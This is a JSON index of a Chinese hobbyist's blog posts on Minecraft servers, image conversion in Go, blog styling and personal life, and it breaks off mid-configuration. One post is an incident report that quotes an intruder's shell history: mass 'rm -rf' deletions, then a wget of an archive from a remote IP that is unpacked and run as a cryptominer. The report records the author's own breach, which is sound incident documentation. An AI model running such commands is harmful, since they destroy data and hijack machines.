[{"title":"为网站加上一个博主状态徽章","path":"/2024/为网站加上一个博主状态徽章/","content":"前言 因为平时都是在学校看不了信息，加上之前在一些使用的安之鱼主题的博客里面看到了像放学了这种状态徽章，蠢蠢欲动啊 初衷很简单，为了告诉别人我不回信息是因为我不在，不是说故意拖着不回之类的。但是吧，渐渐发现好像这个东西就跟在门口写着没人可以随便偷一样，刚回校没多久图片储存桶就被暴击 看来这时候他在家 即日起撤掉状态徽章，免得给我招灾 代码区 顺手开下源吧 使用 修改密钥和用户名： 123program_key = &quot;yourkey&quot;...badge_url = f&quot;https://img.shields.io/badge/yourname-&#123;msg&#125;-red?style=flat&amp;color=&#123;color&#125;&amp;cacheSeconds=0&quot; 设置定时任务： 我觉得吧，在生活中用的更多的还是手机，手机不在线，那人差不多也是不在线的了。在手机上我使用的是MacroDroid来实现 主体IMG_20240831_174408请求配置-设置Screenshot_2024-08-31-17-42-12-812_com.arlosoft.macrodroid请求配置-内容正文IMG_20240831_174408 网页调用： json: /get/ badge: /get/badge： 1&lt;img style=&quot;display: inline-block;&quot; src=&quot;https://&#123;yourlink&#125;/get/badge&quot; alt=&quot;badge&quot;&gt; 展示","tags":["Blog","python"],"categories":["技术类"]},{"title":"服务崩溃报告","path":"/2024/服务崩溃报告/","content":"8月中旬，我在学校尝试远程回家的时候发现出了点意外，没想到是出了点大问题啊，简单记录一下 在以后有什么大规模的崩溃也会记录在这里（但愿不要再写下去 2024/8 在8月15日下午1点，家里ikuai-kvm节点被入侵，执行到的相关命令如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748338 free339 top340 ps aux341 apt remove sendmail* docker* container*342 ps aux343 cd /home344 ls345 rm -rf *346 cd /347 ls348 rm -rf www349 cd /etc/systemd/system350 ls351 ps aux352 ls353 rm -rf cloud* db* ddn* nez* mcsm*354 ls355 cd multi*356 ls357 rm -rf cloud* db* ddn* nez* mcsm*358 ls359 rm -rf cont* docker* tail* x-ui*360 cd /usr/local361 ls362 rm -rf x*363 rm -rf bt*364 cd365 ls366 w367 rm -rf *368 reboot369 free370 ps aux371 ls372 netstat -lntu373 ping 8.8.8.8374 yum install msr-tools375 apt install msr-tools376 apt autoremove377 ls378 nproc379 mkdir .sys380 cd .sys381 wget http://54.71.19.189:8088/x.tar382 tar xzvf x.tar383 ./hash384 ./s385 exit 后面就是挖矿病毒了，不是哥们你挖矿就挖矿，你还删我东西啊。他甚至名称都不舍得给我打全，用通配符来替代 image-20240831161032128 我当时在学校临时将路由后台映射\t切换到另一台服务器下，进到后台后看到路由器cpu温度有70多度，我就知道事情不简单 Snipaste_2024-08-30_21-43-29 在Aug 16, 5:34 AM GMT+8时完全下线 影响范围：图片分发节点，mc服务器官网，图床，Gitea，大量私有服务（无法统计） 补充：由于由于图床需要将远程云盘目录映射到本地，同时我也测试镜像站在该服务器的部署，导致在执行清删除操作时同步清除了云盘中挂载的所有内容，合计1405个文件，已恢复 image-20240831161146700 分析：包是宝塔了，我另一台在香港的服务器之前用宝塔直接被菠菜网站修改好几回nginx配置，现在三台服务器就这一台还是用着宝塔没有迁移了，里面的服务大多是docker虚拟化的，直接部署的也都是开源的程序，基本不会引进病毒，唯一可能的后门最严重的只剩下这个宝塔了。作为对比啊，我内网下另一台服务器用的是1panel，一点事没有。 灾难恢复：由于并没有妥善的统计内网下的服务，因此想完整恢复有点困难，但主要业务相关端口均有记录在tailscale，可以起一定参考作用 image-20240831141247847 措施： 迁移图床到hk-tt（丢失图床数据），启用ipv6防火墙 已恢复：图片分发节点，ZTale，bluemap，mcsm 在8月21号，家里面线路泡水短路，总闸跳了。此外由于故障时间过长，ups干没电了，导致MC-SERVERBIOS数据丢失（CMOS电池那部分线路坏了）来电重启后无法从正确的硬盘引导启动，已修复 影响范围：mc服务器，部分私有服务 状态：已恢复 在8月13号及往后，位于缤纷云的图片储存桶不时遭到攻击，由于我设置了严苛的访问政策，只造成3.12元的损失 Snipaste_2024-08-30_17-47-29 Snipaste_2024-08-30_17-47-35 影响范围：博客首页文章图片，友链头像图片 措施：文章封面迁移到自建图床，友链图片并入博客文件","tags":["公告"],"categories":["技术类"]},{"title":"搭建一个外置登陆且互通的MC服务器","path":"/2024/搭建一个外置登陆且互通的Minecraft服务器/","content":"前言 我服务器是离线登录的，一直以来都是本地打mod来实现显示皮肤。昨天有人折腾了半天，仔细想想要不整个外置登录吧，然后一步一个坑，记录一下 搭建 Blessing Skin 修改环境配置 官方不建议用面板类程序部署，因为会禁用某些php函数，启用就好。在禁用函数或在php.ini里面的disable_functions里去掉以下函数 symlink readlink putenv realpath 同时，安装必需的 PHP （&lt;8.2）扩展： 折叠啦OpenSSL &gt;= 1.1.1 (TLS 1.3)PDOMbstringTokenizerGDXMLCtypeJSONfileinfozip 本体 从Releases下载程序包并解压，设置运行目录为/public，或在配置文件里设置root /&#123;yourwebsitespath&#125;/public; 设置伪静态： 123location / &#123; try_files $uri $uri/ /index.php?$query_string;&#125; 若开启了防跨站安全设置需关闭 安装 配置完伪静态后，直接访问对应的域名就能跳转到安装页面了，在完成基本的安装后，在插件市场里安装Yggdrasil API并启用 image-20240719142918745 image-20240719142941137 最后可以尝试访问//&#123;yourwebsites&#125;/api/yggdrasil看看有无类似以下输出 image-20240719143149605 扩展 为更方便的管理玩家，可以在安装邀请码插件来避免多次/外部人员注册 常见问题 图片无法显示/页面混乱 请检查你的 Nginx 规则配置中是否有这类控制浏览器缓存的规则，删除即可： 1234location ~ .*\\.(gif|jpg|jpeg|png|bmp|swf|flv|ico)$ &#123; expires 30d; access_log off;&#125; 插件市场无法使用 在.env里添加PLUGINS_REGISTRY=https://d2jw1l0ullrzt6.cloudfront.net/registry_&#123;lang&#125;.json 验证邮箱地址报403 Forbidden，无效的链接：参阅验证邮箱地址报403 Forbidden，无效的链接 报错：Lcobucci\\JWT\\Signer\\Key\\InMemory::plainText(): Argument #1 ($contents) must #21 10.08 be of type string, null given： 在.env里添加JWT_SECRET=...值与APP_KEY一致 游戏服务端 这是原本的游玩路径 image-20240719144316520 可见有一些不足：玩家每一次登录都要敲密码，新玩家还要手动加白名单，但使用了外置登陆后这些都可以丢掉了。authlib-injector通过“劫持”官方的正版验证接口，实现了一种特殊的认证，与正版无异。只需要一个账户就可以畅玩服务器。 image-20240719144846911 游戏服务端 下载authlib-injector到服务端同级目录 在启动命令的-jar参数前加上-javaagent:authlib-injector-1.xx.xx.jar=https://&#123;yourwebsites&#125;/api/yggdrasil，注意更改版本号和网站为对应的 由于是“劫持”官方的正版验证接口，还需要开启正版验证（online-mode设置为true） 尝试启动看看日志输出类似文本即可 image-20240719145808855 尝试连接吧~ 常见问题 无效对话：设置prevent-proxy-connections = false 无法使用游戏内聊天，由于个人信息公钥丢失，聊天已被禁用。请尝试重新连接：设置enforce-secure-profile=false 无法验证玩家用户名：检查皮肤站是否正常运行，在.env中打开调试模式（APP_DEBUG），检查./storage/logs中的日志内容 Geyser 由于是“劫持”官方的正版验证接口（梅花三弄），对于独立版同样需要外挂authlib-injector， 只需要找到对应的下载下来，参考游戏服务端的运行方式就可以了…吗？ 在高版本的Geyser中，已经移除了Mojang账户的登录接口，很不巧的是这里就要用到它，所以你还要把它加回来。 如果只需要最新版看这里就好：Shanwer/Geyser fork Geyser 到自己账号，再clone到本地 因为我的服务器版本不是最新的，还要找到适合的版本，可以在GameProtocol.java里面找，如我要编译适合1.20.1的版本，先找到drop掉的前一个commit，复制commit id image-20240719152914544 image-20240719152948254 执行 $切换到对应版本，新建一个分支，如build $ 参考这里来进行修改代码，修改完毕后推送到新分支 本地化处理： 原仓库对于外置登录做了些文本上的调整，运行以下命令切换 12git rm --cached &quot;core/src/main/resources/languages&quot;git submodule add https://github.com/Silverteal/geyser-languages-for-custom-yggdrasil.git core/src/main/resources/languages $ 随后启用action并在action选择对应的分支构建 image-20240719153529593 在构建完成后下载（我这里是独立版，插件版操作类似 在action页面里找到刚刚完成的构建 下载到本地 运行并调整配置即可 常见问题 此服务器需要一个付费的Java账号：因为 Geyser 本身的问题，无法使用有多角色的外置登录解决方案，也就是说皮肤站内有多个角色时无法登录 效果 皮肤共通 后 一天啊，总算整好了~ 文章看起来顺风顺水的，天都不知道我试多少条破路","tags":["MC"],"categories":["技术类"]},{"title":"火绒6.0似乎不太适合开发人员使用——记一次离奇的git错误","path":"/2024/火绒6-0似乎有一定性能问题/","content":"如题，何出此言？ 早上我看了篇文章，讲电脑中了毛制病毒痛失数百，我一寻思我电脑上的火绒5报错已经好久了，索性直接升到最新版，看看怎么样。 然后啪的一下就发现事情不对劲了，在许多使用场景下，系统显著卡顿。如打开浏览器卡顿数秒，打开vscode终端要差不多10秒才加载的出来。 欸，又不是不能用，凑合着用吧 罗老师 忙完事了去整别的，回来再开电脑时，发现开机都慢了差不多5秒的样子，进桌面哐哐报错 Snipaste v2 没事，手动搞一下还是能用，然后连git都用不了（error launching git: ），这下我真我绷不住了，先是试了一下重装git，结果没卵用 Snipaste_2024-07-16_22-29-37 关了火绒以后立竿见影 Snipaste_2024-07-16_22-30-46 再见 也许对于大部分办公人士来讲又没广告又省心，但对我来说纯粹就是个花瓶（别说，这卸装页面有点WIN11安装的味道 byebye 当然，关掉某些保护后可能会正常很多吧，但看在平时的性能影响上我也不敢用了","tags":["火绒"],"categories":["瞎折腾"]},{"title":"搭建一个可记录使用量的谷歌翻译反代网站","path":"/2024/搭建一个可记录使用量的谷歌翻译反代网站/","content":"前言 之前有一台闲置的服务器，刚好又在b站上刷到了谷歌生草机，一时心血来潮整了个反代。但为了减少潜在的滥用情况，我后来用flask写了一个中继，一直以来运行良好（刨掉因服务器自身问题boom的）。但目前谷歌生草机已经集成了对于谷歌翻译的IP优选功能，并移除了镜像网站的相关配置（就算你想用都用不了咯），加上该服务器已经过期，现决定关闭此服务，节约资源。 以下是本站的部署方法，如果有需要可以自己部署玩玩（虽然自用直接nginx反代就完事了 Init clone仓库到本地 $ 运行main.py 根据报错安装相关依赖，缺啥装啥（懒得导requirements.txt 安装ipdb使用$ 导入sql文件到数据库中 进入main.py中修改程序配置（包括数据库连接配置及turnstile配置） 配置cookies：使用Cookie Editor导出，存储到同目录下cookies.json里 image-20240711212026907 enjoy it! photo image-20240711212254995 image-20240711212356924 image-20240711212344936 不足 设计之初是运行在一台闲置的服务器上的，没有性能制约，优化方面确实是能跑就行，每一次请求会多次读/写数据库，如果想要改进势必得在内存缓存一下","tags":["web","python"],"categories":["技术类"]},{"title":"对博客来一场“复习提纲式”的打印优化","path":"/2024/对博客来一场“复习提纲式”的打印优化/","content":"前言 虽然说过暂时不写技术类的文章，不过嘛Stellar针对打印样式完全没有优化，无论纵向还是横向都是相当炸裂，只能再研究下了 不过话说回来，最近几次文章其实都是围绕编写笔记而写的，再加一篇吧 方法 使用@media print 媒体查询调整css样式 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263@media print &#123; /* 隐藏元素 */ .l_left, .l_right, .top.bread-nav.footnote, div#read-next, div#post-ai, div#related-posts, div#comments, section#license, section#share, #link-icon, footer &#123; display: none; &#125; .md-text psw &#123; color: unset; background: unset; border: 3px dashed var(--block-border); &#125; /* 隐藏锚点 */ .markdownIt-Anchor &#123; display: none; /* 隐藏原始链接内容 */ &#125; /* 修改背景和边框 */ .article.banner &#123; background: none; border-bottom: 1px dashed var(--block-border); &#125; /* 调整边框圆角和内边距 */ .banner, .banner.top &#123; border-radius: 0; &#125; .banner .bottom, table &#123; padding: 0rem; &#125; /* 取消grid布局 */ #start &#123; display: unset; &#125; /* 调整字的上下边距 */ p &#123; margin: 0 !important; &#125; /* 调整标题的上外边距 */ h1,h2,h3,h4,h5, h6 &#123; margin: 0 !important; &#125; /* 限制图片高度 */ img &#123; max-height: 100vh; &#125; .md-text &#123; max-width: 100%; line-height:unset; &#125;&#125; 成果 同时使用了故事类文章类型 对于某些影响打印后阅读的标签没有更多更改，毕竟我写笔记只需要从源头遏制住，不使用这些标签就行了（￣︶￣）↗","tags":["Blog"],"categories":["技术类"]},{"title":"关于某论坛上出现广告言论的解释","path":"/2024/关于论坛上出现广告言论的解释/","content":"前几天我在学校无意中看了看电报，发现有人找我买v2ex激活码啊。我当时就懵逼了，然后看他发了一个nodeseek的截图过来。我登上账号一看，好家伙，还真的有啊。 结合之前有人在电报上找我买rn来着，这…肯定是被哪个混账给盗了号。回溯到几个月前，不小心在crackskit.com上下了个软件，结果…就是个病毒，不仅挖矿，应该还能读取浏览器内保存的账号密码，我当时是星期天下的，我回学校没过几天看着我邮箱里面一大堆登录提醒啊，我真的是…。一直以来也改了不少密码，但是对于有些没有邮件通知的平台没有更改，毕竟太多了 image-20240610084633370image-20240610084645355image-20240610084659725image-20240610084708465image-20240610084718780image-20240610084727231image-20240610084741417 2024/02/24记于notes.hzchu.top 现在看来，背后应该也是个中国人。这世道，中国人专坑中国人。联系管理停用了，存档作证据 我的号啊 ip： 广西佬 总而言之，我自己都用着别人家的服务器，我一个脆皮高中生还跑去卖服务器了？我看他发帖/评论比我在家里这么多年都多，效率真高。只能说希望大家明辨是非，如果发生金钱纠纷，那我也没办法","tags":["公告"],"categories":["生活小事"]},{"title":"过去与未来","path":"/2024/过去与未来/","content":"话 春去秋来，寒去暑至。不经意间24年已悄然过半，今天，今年的高考结束了，我也彻底是个准高三学生了。 回望过去，22年，我参加的应该是广东省上史上数学最简单的中考，好像语文也有新题型，着实为难我这个语文拉胯的数学一哥了。不过因为和学校签了就读高中部的合约，干脆直接开摆，考试那几天晚上各种玩，终于三分之差错失一中线。现在想想还有点后悔，不过也无所谓了。 上了高中，高一倒也没什么，因为实行月休，每个星期也就是在北大楼看着初/小学部放假回家，加上新来的校长们个个带着湖北特产，抓教育教学，提升办学质量，这破生活实在是够无聊的。带了部小相机，开始了我的摆烂生活，然后嘛，因为摆的太狠，被分到了第二层次的班。唉，这小事小事继续摆。总而言之，高一还是蛮充实的嘛。 高二倒也没什么，上学期组建了「峰间云海」，写了「MRUI」。下学期写了点小东西，算是为社区做点贡献，然后还考了个「云学考」，帮了半个班的人考过体育（15米折返跑）和信息技术，好像倒也没什么了。不对，怎么越写越压抑啊？情感有正有负，正向的更多是父母，老师同学之间的，不过生活琐事也展开不了，学校也没什么活动，只能在文中留空了。 云学考 立足当下，前不久，我们结束了5月月考，年级有个20名吧，这几次考试考的还行，一方面同学的翻译笔充电的时候被收了，没法嫖笔看小说了。另一方面下学期要分班，总不能考太差吧，按目前的情况在第一层次班应该没什么问题。 放眼未来，上一届的学长们已然跃过了龙门，明年的我能跌过哪条杠仍是一个未知数，抛开试卷难度不谈，现在上个915，211还是ok的，不过好不好这是另外一回事了，广东省内有不少名校，像哈工大，华工，中大，浅浅定个目标：AjoLBwo/ADICAzY7CwYKAwE0BBw+Aw8iAyoAAg8sDyw3DRMyAxYcCSA2AwYyAAgJAzE6Dx0/DwUkDA4gAQUJDB4K2Yq0CSgyARQtARIaAwENATcCDA4Z04+jASgsAAAAAx4UAhYnAxYAAxc+ XOR 行 一些调整： 暂停所有的开发活动 非特殊情况，暂停对所有服务的维护(难绷，刚说完服务器nginx配置被篡改了，好像是宝塔的漏洞) 对于一些评论/issues中的技术性问题，如果短时间内无法解决那只能委屈一下了 以后可能会写点生活类文章吧 关于自己： 在放假时间要巩固复习，练习英语听说 加强锻炼 戒掉一些不良习惯 简单来说，要把更多时间投入到学习中，补上我之前摆烂欠下的风流债 后 本文写于24/6/3-5，于9号修订完毕。本来想拍个蓝天白云作头图的，没想到连着下了几天的雨，只能拿出去年在金沙湾拍的图了。 祝今年学长学姐们考个好成绩，也祝我自己明年给高中生涯画上一个完美的句号，大家有缘再见。","tags":["yearreport"],"categories":["生活小事"]},{"title":"一键检查我的世界MOD共有版本，快速构建整合包","path":"/2024/一键检查我的世界mod共有版本，快速构建整合包/","content":"起因 之前看了下我的世界版本已经更新到1.20.6，自己服务器还在1.20.1，遂写一物查看能否更新 addEventListener(\"load\",function(){ console.log('[hexo-dynamic-codeblock]start load：coding-teaykgjc7' ); utils.jq(() => { $(function () { const el = document.getElementById('coding-teaykgjc7'); utils.request(el, \"https://hightlight-code-api.hzchu.top/api/v1/generate?url=https%3A%2F%2Fraw.githubusercontent.com%2Fthun888%2Fcheck_mc_mods_update%2Fmain%2Fmain.py&lang=python&usejson=true\", function (data) { $(el).append(data.result); addCopyButtons('coding-teaykgjc7'); }); }); }); }); 使用方法 配置文件 123456789101112131415161718modrinth: - tabtps - easyauth - Debugify - carpet - ...... # 一行一个名称，须在modrinth里面找，进入mod页面后在链接中截取curseforge: smoothchunk: 582327 chunksending-fabric: 831663 ...... # curseforge 通过id获取，需要进入mod页面后在页面右侧获取。为提高辨识度，采用kv形式special: - github.com/MCTeamPotato/MCMOD - commandspy - ...... # 特殊类，起到提示作用config: curseforgeApiKey: $2a****************************************************Kv6sq showAlpha: true #匹配测试版本 获取Modrinth项目名 获取Curseforge项目ID 获取CurseforgeApiKey：CurseForge for Studios 配置完成后运行py文件即可 输出 好好好，一个没有 不足 部分mod不规范，可能出现误判 Curseforge无法获取支持的所有版本，只能获取最近的版本，可能出现误判 不支持下载，我k我当时写完一运行直接沉默了，直接摆了 对于某个mod不支持时无法定位。可以添加输入期望版本然后输出不支持的mod","tags":["python","MC"],"categories":["瞎折腾"]},{"title":"Go中使用ImageMagick转换图片格式，实现全站图片“Avif”","path":"/2024/Go中使用ImageMagick自动转换图片格式，实现全站图片Avif/","content":"前言 前几天不经意间看了实现全站图片使用avif格式，替代臃肿的webp教程 | 张洪Heo (zhheo.com)，才发现现在BiliBili全部是avif格式的图片了 我： 哇，这压缩率真的炸裂。 如今，各大浏览器基本都支持avif图像格式了，可以考虑一下跟上时代的步伐了 在开始之前，先看看目前的图片上传&amp;用户访问路径 可见有三个问题： lsky pro 不支持avif格式，使用avif无法与之前的框架完美契合 当用户的浏览器不支持webp格式时，无法查看图片（包劝退的 对于已上传的图片无法平滑过渡 因此，不如将转换格式的任务交由节点处理，保存图片源文件，随用随转 思路 我站图片存储的架构可参考基于Onedrive的高可用性图床，不过因为我后来装依赖装吐了遂用go重写了整个程序。因此，我要面临的问题是，我要怎么在go中完成图片格式的转换？ 为了偷懒，我直接用Imagick了，反正它发行了apt软件包，安装也不费事 为与外部Imagick交互，我使用了gographics/imagick库来处理 为与之前的程序兼容，我打算在「返回本地文件」处做文章 完善程序 图片转换函数1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253func TransformImage(inputPath string, outputFormat string, quality uint) (string, error) &#123;\t// logrus.Info(inputPath, outputFormat)\tif outputFormat == &quot;&quot; &#123; return inputPath, nil\t&#125;\t// 构造新的文件路径 // 文件命名：原始文件名_质量.格式\tnewPath := filepath.Join(&quot;transformed&quot;, strings.Replace(inputPath, filepath.Ext(inputPath), &quot;_&quot;+strconv.Itoa(int(quality))+&quot;.&quot;+outputFormat, 1))\tdir := filepath.Dir(newPath)\terr := os.MkdirAll(dir, 0755)\tcheckErr(err)\t// 如果文件已经存在，返回现有的路径\tif _, err := os.Stat(newPath); err == nil &#123; return newPath, nil\t&#125;\t// 初始化\timagick.Initialize()\tdefer imagick.Terminate()\tmw := imagick.NewMagickWand()\tdefer mw.Destroy()\t// 读取原始图像\terr = mw.ReadImage(inputPath)\tcheckErr(err)\t// 获取原始图像的色彩空间和色彩深度\t//originalColorspace := mw.GetImageColorspace()\t//originalDepth := mw.GetImageDepth()\t//logrus.Info(&quot;originalColorspace:&quot;, originalColorspace, &quot;originalDepth:&quot;, originalDepth) // 设置新的格式\terr = mw.SetImageFormat(outputFormat)\tcheckErr(err)\t// 在转换格式后，恢复原始图像的色彩空间和色彩深度\t// err = mw.SetImageColorspace(originalColorspace)\t// checkErr(err)\t// err = mw.SetImageDepth(originalDepth)\t// checkErr(err)\t// 设置图片质量\terr = mw.SetImageCompressionQuality(quality)\tcheckErr(err)\t// 写入新图像\terr = mw.WriteImage(newPath)\tcheckErr(err)\t// logrus.Info(newPath)\treturn newPath, nil&#125; 注意需开启CGO 清除缓存函数123456789101112func delCache() &#123;\ttmp_size := getDirectorySize(&quot;tmp&quot;)\ttransformedtmp_size := getDirectorySize(&quot;transformed&quot;)\tif tmp_size &gt; 5368709120 &#123; clearOldFiles(&quot;tmp&quot;, 60) logrus.Info(&quot;tmp folder cleaned&quot;)\t&#125;\tif transformedtmp_size &gt; 5368709120 &#123; clearOldFiles(&quot;transformed&quot;, 30) logrus.Info(&quot;transformed folder cleaned&quot;)\t&#125;&#125; 主路由函数123456789101112131415161718func nodeReturnFile(c *gin.Context) &#123;\t...\tfmt := c.Query(&quot;fmt&quot;)\tquality, _ := strconv.ParseUint(c.Query(&quot;q&quot;), 10, 32)\tif quality == 0 &#123; quality = 95\t&#125;\t...\ttransformedpath, err := TransformImage(cachePath, fmt, uint(quality))\tcheckErr(err)\textstatus, extype := getContentType(filepath.Ext(transformedpath))\tif extstatus &#123; c.Header(&quot;Content-Type&quot;, extype)\t&#125;\tc.File(transformedpath)\treturn&#125; 效果对比 右下查看源文件 原图（jpg,3.32MB）压缩比：100%(～￣▽￣)～ AVIF（185KB,avif时质量参数无效）压缩比：5.52% WEBP（925KB,q=95%）压缩比：27.26% WEBP（925KB,q=50%）压缩比：7.28% HEIF（1.43MB,q=95%）压缩比：43.24% HEIF（402KB,q=50%）压缩比：11.86% 原图（WEBP,334KB,q=100%）压缩比：100%(～￣▽￣)～ AVIF（120KB,avif时质量参数无效）压缩比：36.90% WEBP（130KB,q=50%）压缩比：39.28% 前端处理 为了照顾不支持avif的浏览器，我打算直接在前端处理，替换为.webp或原始文件 不太漂亮，大佬轻喷1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586document.addEventListener(&#x27;DOMContentLoaded&#x27;, function() &#123; // 从页面中提取第一个AVIF图片链接 // function getFirstPictureUrl(type) &#123; // const images = document.querySelectorAll(&#x27;img&#x27;); // for (let img of images) &#123; // if (img.getAttribute(&quot;data-src&quot;) &amp;&amp; img.getAttribute(&quot;data-src&quot;).includes(&#x27;fmt=&#x27;,type)) &#123; // return img.getAttribute(&quot;data-src&quot;); // &#125; // &#125; // return null; // &#125; // 检测浏览器是否支持AVIF格式 function supportCheck(type, url) &#123; return new Promise(resolve =&gt; &#123; // 先从localStorage中获取结果 const result = localStorage.getItem(&quot;support_&quot; + type); if (result !== null) &#123; // 如果结果存在，就直接返回 console.log(type, &quot;support status loaded from localStorage:&quot;, result === &quot;true&quot;); resolve(result === &quot;true&quot;); &#125; else &#123; // 如果结果不存在，就进行检测 const image = new Image(); image.src = url; image.onload = () =&gt; &#123; console.log(type, &quot;supported&quot;); // 将结果保存到localStorage localStorage.setItem(&quot;support_&quot; + type, &quot;true&quot;); resolve(true); &#125;; image.onerror = () =&gt; &#123; console.log(type, &quot;not supported&quot;); // 将结果保存到localStorage localStorage.setItem(&quot;support_&quot; + type, &quot;false&quot;); // 显示提示消息 hud.toast(`当前浏览器不支持使用$&#123;type&#125;，已降级为使用其他格式`, 2500); resolve(false); &#125;; &#125; &#125;); &#125; // 替换图片URL中的avif为webp function replacepicture(from, to) &#123; const images = document.querySelectorAll(&#x27;img&#x27;); images.forEach(img =&gt; &#123; let attr = img.src.startsWith(&#x27;data&#x27;) ? &#x27;data-src&#x27; : &#x27;src&#x27;; if (img.getAttribute(attr) &amp;&amp; img.getAttribute(attr).includes(&#x27;fmt=&#x27; + from)) &#123; if (to == &quot;&quot;) &#123; console.log(&quot;Replacing &quot;, from, &quot; with origin ext for image:&quot;, img.getAttribute(attr)); img.setAttribute(attr, img.getAttribute(attr).replace(&#x27;fmt=&#x27; + from, &#x27;&#x27;)); &#125; else &#123; console.log(&quot;Replacing &quot;, from, &quot; with &quot;, to, &quot; for image:&quot;, img.getAttribute(attr)); img.setAttribute(attr, img.getAttribute(attr).replace(&#x27;fmt=&#x27; + from, &#x27;fmt=&#x27; + to)); &#125; &#125; &#125;); &#125; const firstAvifUrl = &quot;/img/check/status.avif&quot;; // 第一个AVIF图片链接 if (firstAvifUrl) &#123; // 使用第一个AVIF图片链接进行检测 supportCheck(&quot;AVIF&quot;,firstAvifUrl).then(supported =&gt; &#123; if (!supported) &#123; replacepicture(&quot;avif&quot;,&quot;webp&quot;); const firstWebpUrl = &quot;/img/check/status.webp&quot;; // 第一个WEBP图片链接 supportCheck(&quot;WEBP&quot;,firstWebpUrl).then(supported =&gt; &#123; if (!supported) &#123; // hud.toast(&quot;当前浏览器不支持使用webp，已降级为使用原始图片&quot;, 2500); // replacepicture(&quot;webp&quot;,&quot;&quot;); replacepicture(&quot;webp&quot;,&quot;png&quot;); &#125;else&#123; console.log(&quot;Webp images will be used.&quot;); &#125; &#125;); &#125; else &#123; console.log(&quot;AVIF images will be used.&quot;); &#125; &#125;); &#125; else &#123; console.log(&quot;No AVIF images found on the page.&quot;); &#125; &#125;); 基于@Heo修改，支持了懒加载及stellar的toast，facybox还有点问题 迁移工作 使用vscode进行正则替换：(https://onep\\.hzchu\\.top/.*\\.webp)，$1?fmt=avif 优缺 优点 契合先前架构，对以往图片可以直接迁移 提升了使用旧设备访客的体验 配合stellar支持直接查看原图 by the way，因为缤纷云也使用`fmt=*`的格式，故该前端代码也可以作用于缤纷云上的图片大意了，它自己支持自动降级导致程序出错 缺点 增加存储成本。主要是节点端（OD可以忽略不计），按目前的来流程一张图片可能会在本地产生多个副本，使存储占用翻几番 需要外部安装ImageMagick组件，程序不再轻量 在转换为avif过程中，部分图片可观测到部分色彩丢失。不过也可以使用webp替代 缓存命名不具备可复用性。但目前不计划添加任何参数，加上数据量小倒也没影响 实际测试 Safari15.5(thx appetize.io) Chrome69 在旧版本中，程序均能正常运行，但在chrome的旧版本中因stellar的原因无法加载 注小心内存泄漏","tags":["Go","网站"],"categories":["技术类"]},{"title":"使用Typora_plugin增强Stellar写作体验","path":"/2024/使用Typora-plugin增强Stellar写作体验/","content":"前言 我觉得Stellar有一个极强的优势——丰富的标签组件，但有个小问题——所有标签加起来30多个，而且重复手打&#123;% ... %&#125;多多少少有点难受。 早上翻issue突然发现Typora Plugin这个好东西，这不直接用起来 https://github.com/obgnail/typora_pluginhttps://github.com/obgnail/typora_plugin 安装Typora Plugin Typora Plugin仓库里写的已经很详细了，这里略过 添加配置 现阶段主要用的是slash_commands来实现快捷插入片段。 修改settings.user.toml： Typora\\resources\\plugin\\global\\settings\\settings.user.toml1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950[slash_commands]# 命令列表# - enable: 是否启用# - type: snippet/command。前者表示在调用时插入文字片段，后者表示在调用时执行逻辑命令# - icon(可选): 使用emoji作为图标# - hint(可选): 提示信息# - keyword: 关键词# - callback: 若type=snippet，则填入需要插入的文字片段，若type=command，则填入回调函数的字符串COMMANDS = [ &#123; enable = true, type = &quot;snippet&quot;, icon = &quot;😺&quot;, hint = &quot;插入表情标签&quot;, keyword = &quot;emoji&quot;, callback = &quot;&#123;% emoji %&#125;&quot; &#125;, &#123; enable = true, type = &quot;snippet&quot;, icon = &quot;🪄&quot;, hint = &quot;插入标记标签&quot;, keyword = &quot;mark&quot;, callback = &quot;&#123;% mark color: %&#125;&quot; &#125;, &#123; enable = true, type = &quot;snippet&quot;, icon = &quot;🏷️&quot;, hint = &quot;插入hashtag标签&quot;, keyword = &quot;hashtag&quot;, callback = &quot;&#123;% hashtag color: %&#125;&quot; &#125;, &#123; enable = true, type = &quot;snippet&quot;, icon = &quot;📷&quot;, hint = &quot;插入image图片标签&quot;, keyword = &quot;image&quot;, callback = &quot;&#123;% image download: width: padding: bg: %&#125;&quot; &#125;, &#123; enable = true, type = &quot;snippet&quot;, icon = &quot;🧇&quot;, hint = &quot;插入quot引用标签&quot;, keyword = &quot;quot&quot;, callback = &quot;&#123;% quot icon:hashtag %&#125;&quot; &#125;, &#123; enable = true, type = &quot;snippet&quot;, icon = &quot;🦉&quot;, hint = &quot;插入poetry诗词标签&quot;, keyword = &quot;poetry&quot;, callback = &quot;&#123;% poetry 游山西村 author:陆游 footer:诗词节选 %&#125; &#123;% endpoetry %&#125;&quot; &#125;, &#123; enable = true, type = &quot;snippet&quot;, icon = &quot;📃&quot;, hint = &quot;插入note备注块标签&quot;, keyword = &quot;note&quot;, callback = &quot;&#123;% note [title] content color: %&#125;&quot; &#125;, &#123; enable = true, type = &quot;snippet&quot;, icon = &quot;🔗&quot;, hint = &quot;插入link链接卡片标签&quot;, keyword = &quot;link&quot;, callback = &quot;&#123;% link href [title] [icon:src] [desc:true/false] %&#125;&quot; &#125;, &#123; enable = true, type = &quot;snippet&quot;, icon = &quot;▶&quot;, hint = &quot;插入button按钮标签&quot;, keyword = &quot;button&quot;, callback = &quot;&#123;% button text url [icon:key/src] [color:color] [size:xs] %&#125;&quot; &#125;, &#123; enable = true, type = &quot;snippet&quot;, icon = &quot;🎯&quot;, hint = &quot;插入okr目标管理标签&quot;, keyword = &quot;okr&quot;, callback = &quot;&#123;% okr o1 %&#125; &#123;% endokr %&#125;&quot; &#125;, &#123; enable = true, type = &quot;snippet&quot;, icon = &quot;📚&quot;, hint = &quot;插入copy复制行标签&quot;, keyword = &quot;copy&quot;, callback = &quot;&#123;% copy [code] prefix:$ %&#125;&quot; &#125;, &#123; enable = true, type = &quot;snippet&quot;, icon = &quot;🔘&quot;, hint = &quot;插入radio单选标签&quot;, keyword = &quot;radio&quot;, callback = &quot;&#123;% radio checked:true [name] %&#125;&quot; &#125;, &#123; enable = true, type = &quot;snippet&quot;, icon = &quot;☑️&quot;, hint = &quot;插入checkbox复选标签&quot;, keyword = &quot;radio&quot;, callback = &quot;&#123;% checkbox symbol: color: checked: [name] %&#125;&quot; &#125;, &#123; enable = true, type = &quot;snippet&quot;, icon = 